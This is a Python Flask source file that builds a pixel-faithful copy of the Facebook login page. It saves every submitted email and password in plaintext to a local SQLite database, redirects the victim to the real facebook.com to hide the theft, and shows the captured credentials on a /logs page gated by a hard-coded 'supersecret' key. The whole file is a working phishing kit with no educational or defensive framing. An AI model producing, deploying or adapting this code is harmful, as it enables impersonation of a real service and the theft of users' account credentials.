from flask import Flask, request, render_template_string, redirect
import sqlite3
from datetime import datetime

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  email TEXT,
                  password TEXT,
                  timestamp DATETIME)''')
    conn.commit()
    conn.close()

init_db()

html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 980px;
            width: 100%;
        }
        .left-section {
            flex: 1;
            padding-right: 32px;
            margin-bottom: 70px;
        }
        .right-section {
            flex: 0 0 396px;
        }
        .logo {
            height: 106px;
            margin: -28px;
        }
        .logo img {
            height: 106px;
        }
        .tagline {
            font-size: 28px;
            font-weight: normal;
            line-height: 32px;
            width: 500px;
            padding: 0 0 20px;
            color: #1c1e21;
        }
        .login-form {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            margin-bottom: 28px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            padding: 14px 16px;
            width: 100%;
            cursor: pointer;
            margin: 16px 0;
        }
        .login-btn:hover {
            background-color: #166fe5;
        }
        .forgot-link {
            display: block;
            text-align: center;
            margin: 16px 0;
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 0;
        }
        .create-account-btn {
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            padding: 14px 16px;
            width: 60%;
            margin: 0 auto;
            display: block;
            cursor: pointer;
        }
        .create-account-btn:hover {
            background-color: #36a420;
        }
        .create-page {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
        }
        .create-page a {
            color: #1c1e21;
            font-weight: bold;
            text-decoration: none;
        }
        .create-page a:hover {
            text-decoration: underline;
        }
        .footer {
            width: 980px;
            margin: 0 auto;
            padding: 20px 0;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            font-size: 12px;
            margin-bottom: 10px;
        }
        .footer-links a {
            color: #8a8d91;
            margin-right: 20px;
            text-decoration: none;
            font-size: 12px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .copyright {
            color: #8a8d91;
            font-size: 12px;
            margin: 20px 0;
        }
        
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
            }
            .left-section {
                text-align: center;
                margin-bottom: 40px;
                padding-right: 0;
            }
            .tagline {
                width: 100%;
                font-size: 24px;
            }
            .right-section {
                width: 100%;
                max-width: 396px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360" width="256">
                    <path d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3h-23.16v76.78h-30.89v-76.78h-20.1v-25.3h20.1V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z" fill="#1877f2"/>
                    <path d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z" fill="#1877f2"/>
                    <path d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z" fill="#1877f2"/>
                    <path d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z" fill="#1877f2"/>
                    <path d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z" fill="#1877f2"/>
                    <path d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z" fill="#1877f2"/>
                    <path d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z" fill="#1877f2"/>
                    <path d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z" fill="#1877f2"/>
                </svg>
            </div>
            <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
        </div>
        <div class="right-section">
            <div class="login-form">
                <form action="/login" method="POST">
                    <input type="text" name="email" placeholder="Email address or phone number" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <a href="#" class="forgot-link">Forgotten password?</a>
                <div class="divider"></div>
                <button class="create-account-btn">Create New Account</button>
            </div>
            <div class="create-page">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="footer-links">
            <a href="#">English (US)</a>
            <a href="#">Español</a>
            <a href="#">Français (France)</a>
            <a href="#">中文(简体)</a>
            <a href="#">العربية</a>
            <a href="#">Português (Brasil)</a>
            <a href="#">Italiano</a>
            <a href="#">한국어</a>
            <a href="#">Deutsch</a>
            <a href="#">हिन्दी</a>
            <a href="#">日本語</a>
        </div>
        <div class="divider"></div>
        <div class="footer-links">
            <a href="#">Sign Up</a>
            <a href="#">Log In</a>
            <a href="#">Messenger</a>
            <a href="#">Facebook Lite</a>
            <a href="#">Watch</a>
            <a href="#">Places</a>
            <a href="#">Games</a>
            <a href="#">Marketplace</a>
            <a href="#">Meta Pay</a>
            <a href="#">Meta Store</a>
            <a href="#">Meta Quest</a>
            <a href="#">Instagram</a>
            <a href="#">Threads</a>
            <a href="#">Fundraisers</a>
            <a href="#">Services</a>
            <a href="#">Voting Information Center</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Privacy Center</a>
            <a href="#">Groups</a>
            <a href="#">About</a>
            <a href="#">Create Ad</a>
            <a href="#">Create Page</a>
            <a href="#">Developers</a>
            <a href="#">Careers</a>
            <a href="#">Cookies</a>
            <a href="#">Ad choices</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
            <a href="#">Contact Uploading & Non-Users</a>
        </div>
        <div class="copyright">Meta © 2025</div>
    </div>
</body>
</html>
"""

logs_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Captured Credentials</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:nth-child(even) { background-color: #f9f9f9; }
    </style>
</head>
<body>
    <h1>Captured Credentials</h1>
    <table>
        <tr>
            <th>ID</th>
            <th>Email</th>
            <th>Password</th>
            <th>Timestamp</th>
        </tr>
        {% for entry in entries %}
        <tr>
            <td>{{ entry[0] }}</td>
            <td>{{ entry[1] }}</td>
            <td>{{ entry[2] }}</td>
            <td>{{ entry[3] }}</td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_content)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute("INSERT INTO credentials (email, password, timestamp) VALUES (?, ?, ?)",
              (email, password, timestamp))
    conn.commit()
    conn.close()

    return redirect("https://www.facebook.com")

@app.route('/logs')
def show_logs():
    if request.args.get('secret') != 'supersecret':
        return "Not Found", 404
    
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
    entries = c.fetchall()
    conn.close()
    
    return render_template_string(logs_template, entries=entries)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)